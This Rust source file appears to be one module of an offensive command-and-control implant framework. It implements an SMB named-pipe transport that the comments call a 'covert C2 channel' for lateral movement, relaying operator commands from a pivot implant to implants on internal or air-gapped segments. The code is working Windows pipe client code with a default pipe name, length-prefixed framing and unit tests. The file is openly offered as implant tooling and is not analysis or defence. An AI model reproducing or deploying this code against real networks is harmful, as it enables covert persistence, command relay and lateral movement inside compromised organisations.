//! SMB Named Pipe C2 transport — internal lateral movement channel.
//!
//! CS 4.13 + BRC4 v2.5 use SMB named pipes for lateral movement within an
//! internal network. An implant on an internet-connected host relays C2 commands
//! to air-gapped/internal-segment implants via named pipes over SMB. The pipe
//! server (listener) runs on the pivot host; each air-gapped implant connects as
//! a pipe client.
//!
//! ## Wire format
//! - 4-byte little-endian payload length prefix
//! - Payload bytes
//!
//! ## Platform
//! Named pipes are Windows-only. On non-Windows all methods return
//! `TransportError::Dead`.

use crate::traits::{Transport, TransportError};

// ---- Windows FFI bindings ---------------------------------------------------

#[cfg(windows)]
mod win32 {
    use std::os::windows::io::RawHandle;

    pub const INVALID_HANDLE_VALUE: isize = -1;
    pub const GENERIC_READ: u32 = 0x80000000;
    pub const GENERIC_WRITE: u32 = 0x40000000;
    pub const OPEN_EXISTING: u32 = 3;
    pub const ERROR_PIPE_BUSY: u32 = 231;
    #[allow(dead_code)] // reserved for future WaitNamedPipe integration
    pub const NMPWAIT_USE_DEFAULT_WAIT: u32 = 0;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: *const u16,
            dwDesiredAccess: u32,
            dwShareMode: u32,
            lpSecurityAttributes: *const std::ffi::c_void,
            dwCreationDisposition: u32,
            dwFlagsAndAttributes: u32,
            hTemplateFile: RawHandle,
        ) -> RawHandle;

        pub fn ReadFile(
            hFile: RawHandle,
            lpBuffer: *mut u8,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *const std::ffi::c_void,
        ) -> i32;

        pub fn WriteFile(
            hFile: RawHandle,
            lpBuffer: *const u8,
            nNumberOfBytesToWrite: u32,
            lpNumberOfBytesWritten: *mut u32,
            lpOverlapped: *const std::ffi::c_void,
        ) -> i32;

        pub fn CloseHandle(hObject: RawHandle) -> i32;

        pub fn WaitNamedPipeW(lpNamedPipeName: *const u16, nTimeOut: u32) -> i32;

        pub fn GetLastError() -> u32;
    }
}

// ---- Constants --------------------------------------------------------------

/// Default named pipe path (well-known C2 pipe name).
const DEFAULT_PIPE: &str = "\\\\.\\pipe\\nyx";

/// Maximum frame size for SMB pipe transport — 1 MiB.
const MAX_FRAME: usize = 1024 * 1024;
/// Length prefix size in bytes (little-endian u32).
#[cfg(windows)]
const PREFIX_LEN: usize = 4;

// ---- SmbPipeTransport -------------------------------------------------------

/// Covert C2 channel over SMB named pipes for internal lateral movement.
///
/// Frames are length-prefixed with a 4-byte LE u32. The pipe server (C2 relay
/// implant) listens on a well-known pipe name; air-gapped implants connect as
/// clients. This channel is used when direct internet access is unavailable but
/// SMB/CIFS traffic is permitted between network segments.
#[cfg_attr(not(windows), allow(dead_code))]
pub struct SmbPipeTransport {
    /// Named pipe path (e.g. `\\\\.\\pipe\\nyx`).
    pipe_name: String,
    /// Open handle to the named pipe. `INVALID_HANDLE_VALUE` when disconnected.
    #[cfg(windows)]
    handle: std::os::windows::io::RawHandle,
    /// Whether the pipe is currently connected.
    connected: bool,
}

// ---- Constructor ------------------------------------------------------------

impl SmbPipeTransport {
    /// Create a new SMB pipe transport with the default pipe name.
    pub fn new() -> Self {
        Self::with_pipe(DEFAULT_PIPE)
    }

    /// Create a new SMB pipe transport with a custom pipe name.
    pub fn with_pipe(pipe_name: impl Into<String>) -> Self {
        SmbPipeTransport {
            pipe_name: pipe_name.into(),
            #[cfg(windows)]
            handle: win32::INVALID_HANDLE_VALUE as std::os::windows::io::RawHandle,
            connected: false,
        }
    }
}

impl Default for SmbPipeTransport {
    fn default() -> Self {
        Self::new()
    }
}

// ---- Windows: real implementation -------------------------------------------

#[cfg(windows)]
impl Transport for SmbPipeTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        // Ensure we're connected.
        if !self.connected {
            self.connect()?;
        }

        // Write 4-byte LE length prefix.
        let len = frame.len() as u32;
        let prefix = len.to_le_bytes();
        if !self.write_all(&prefix) {
            self.disconnect();
            return Err(TransportError::Transient("smb-pipe: write prefix failed"));
        }

        // Write frame payload.
        if !self.write_all(frame) {
            self.disconnect();
            return Err(TransportError::Transient("smb-pipe: write payload failed"));
        }

        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        if !self.connected {
            // For recv, try connecting with the given timeout.
            self.connect_timeout(timeout_ms)?;
        }

        // Read 4-byte LE length prefix.
        let mut prefix = [0u8; PREFIX_LEN];
        if !self.read_exact(&mut prefix, timeout_ms) {
            // If we time out with no data, that's a Timeout, not Dead.
            return Err(TransportError::Timeout);
        }

        let payload_len = u32::from_le_bytes(prefix) as usize;
        if payload_len > self.max_frame_size() {
            self.disconnect();
            return Err(TransportError::PayloadTooLarge(payload_len));
        }

        // Read payload.
        let mut buf = vec![0u8; payload_len];
        if !self.read_exact(&mut buf, timeout_ms) {
            self.disconnect();
            return Err(TransportError::Transient("smb-pipe: read payload failed"));
        }

        Ok(buf)
    }

    fn health_check(&self) -> Option<u64> {
        if !self.connected {
            return None;
        }
        // A connected pipe handle is alive — we can't easily measure latency
        // without sending data, but the handle being open is a decent signal.
        // Return 0 to indicate "alive, latency unknown."
        Some(0)
    }

    fn name(&self) -> &'static str {
        "smb-pipe"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }
}

#[cfg(windows)]
impl SmbPipeTransport {
    /// Connect to the named pipe (no timeout — blocks until available or fails).
    fn connect(&mut self) -> Result<(), TransportError> {
        self.connect_inner(None)
    }

    /// Connect with a timeout in milliseconds.
    fn connect_timeout(&mut self, timeout_ms: u32) -> Result<(), TransportError> {
        self.connect_inner(Some(timeout_ms))
    }

    fn connect_inner(&mut self, timeout_ms: Option<u32>) -> Result<(), TransportError> {
        use std::os::windows::ffi::OsStrExt;
        use win32::*;

        // Encode pipe name as UTF-16 (Windows wide string).
        let wide: Vec<u16> = std::ffi::OsStr::new(&self.pipe_name)
            .encode_wide()
            .chain(std::iter::once(0)) // null terminator
            .collect();

        // If a timeout was requested, wait for the pipe to become available.
        if let Some(ms) = timeout_ms {
            // WaitNamedPipeW returns non-zero on success (pipe available).
            // Returns 0 on timeout or error.
            let wait_result = unsafe { WaitNamedPipeW(wide.as_ptr(), ms) };
            if wait_result == 0 {
                let _err = unsafe { GetLastError() };
                return Err(TransportError::Transient("smb-pipe: pipe not available"));
            }
        }

        let handle = unsafe {
            CreateFileW(
                wide.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0, // dwShareMode — exclusive access
                std::ptr::null(),
                OPEN_EXISTING,
                0, // synchronous IO — ReadFile/WriteFile use NULL OVERLAPPED; FILE_FLAG_OVERLAPPED without an OVERLAPPED struct fails with ERROR_INVALID_PARAMETER.
                INVALID_HANDLE_VALUE as std::os::windows::io::RawHandle,
            )
        };

        if handle == INVALID_HANDLE_VALUE as std::os::windows::io::RawHandle {
            let err = unsafe { GetLastError() };
            if err == ERROR_PIPE_BUSY {
                return Err(TransportError::Transient("smb-pipe: pipe busy"));
            }
            return Err(TransportError::Dead("smb-pipe: CreateFileW failed"));
        }

        self.handle = handle;
        self.connected = true;
        Ok(())
    }

    /// Write all bytes to the pipe. Returns false on failure.
    fn write_all(&self, buf: &[u8]) -> bool {
        use win32::*;

        let mut written: u32 = 0;
        let result = unsafe {
            WriteFile(
                self.handle,
                buf.as_ptr(),
                buf.len() as u32,
                &mut written,
                std::ptr::null(),
            )
        };
        result != 0 && written as usize == buf.len()
    }

    /// Read exactly `buf.len()` bytes from the pipe. Returns false on failure
    /// or timeout.
    fn read_exact(&self, buf: &mut [u8], timeout_ms: u32) -> bool {
        use win32::*;

        let mut total: usize = 0;
        let start = std::time::Instant::now();

        while total < buf.len() {
            let mut bytes_read: u32 = 0;
            let result = unsafe {
                ReadFile(
                    self.handle,
                    buf.as_mut_ptr().add(total),
                    (buf.len() - total) as u32,
                    &mut bytes_read,
                    std::ptr::null(),
                )
            };

            if result == 0 || bytes_read == 0 {
                // Check for timeout.
                if start.elapsed().as_millis() as u32 >= timeout_ms {
                    return false;
                }
                // Brief yield before retry — avoid busy-waiting.
                std::thread::sleep(std::time::Duration::from_millis(10));
                continue;
            }

            total += bytes_read as usize;
        }

        true
    }

    /// Disconnect and close the pipe handle.
    fn disconnect(&mut self) {
        use std::os::windows::io::RawHandle;
        use win32::*;

        if self.handle != INVALID_HANDLE_VALUE as RawHandle {
            unsafe {
                CloseHandle(self.handle);
            }
            self.handle = INVALID_HANDLE_VALUE as RawHandle;
        }
        self.connected = false;
    }
}

#[cfg(windows)]
impl Drop for SmbPipeTransport {
    fn drop(&mut self) {
        self.disconnect();
    }
}

// ---- Non-Windows: dead stub -------------------------------------------------

#[cfg(not(windows))]
impl Transport for SmbPipeTransport {
    fn send(&mut self, _frame: &[u8]) -> Result<(), TransportError> {
        Err(TransportError::Dead(
            "smb-pipe: Windows-only (SMB named pipes unavailable on this platform)",
        ))
    }

    fn recv(&mut self, _timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        Err(TransportError::Dead(
            "smb-pipe: Windows-only (SMB named pipes unavailable on this platform)",
        ))
    }

    fn health_check(&self) -> Option<u64> {
        None
    }

    fn name(&self) -> &'static str {
        "smb-pipe"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }
}

// ---- Tests ------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_pipe_name() {
        let t = SmbPipeTransport::new();
        assert_eq!(t.pipe_name, DEFAULT_PIPE);
        assert!(!t.connected);
        assert_eq!(t.name(), "smb-pipe");
        assert_eq!(t.max_frame_size(), MAX_FRAME);
    }

    #[test]
    fn test_custom_pipe_name() {
        let t = SmbPipeTransport::with_pipe("\\\\.\\pipe\\custom");
        assert_eq!(t.pipe_name, "\\\\.\\pipe\\custom");
    }

    #[test]
    fn test_default_impl() {
        let t = SmbPipeTransport::default();
        assert_eq!(t.pipe_name, DEFAULT_PIPE);
    }

    #[test]
    fn test_health_check_when_disconnected() {
        let t = SmbPipeTransport::new();
        assert_eq!(t.health_check(), None);
    }

    #[cfg(windows)]
    #[test]
    fn test_payload_too_large() {
        let mut t = SmbPipeTransport::new();
        let huge = vec![0u8; MAX_FRAME + 1];
        let result = t.send(&huge);
        assert!(matches!(result, Err(TransportError::PayloadTooLarge(s)) if s == MAX_FRAME + 1));
    }

    #[cfg(not(windows))]
    #[test]
    fn test_dead_on_non_windows() {
        let mut t = SmbPipeTransport::new();
        assert!(matches!(t.send(b"test"), Err(TransportError::Dead(_))));
        assert!(matches!(t.recv(1000), Err(TransportError::Dead(_))));
        assert_eq!(t.health_check(), None);
        assert_eq!(t.name(), "smb-pipe");
    }
}
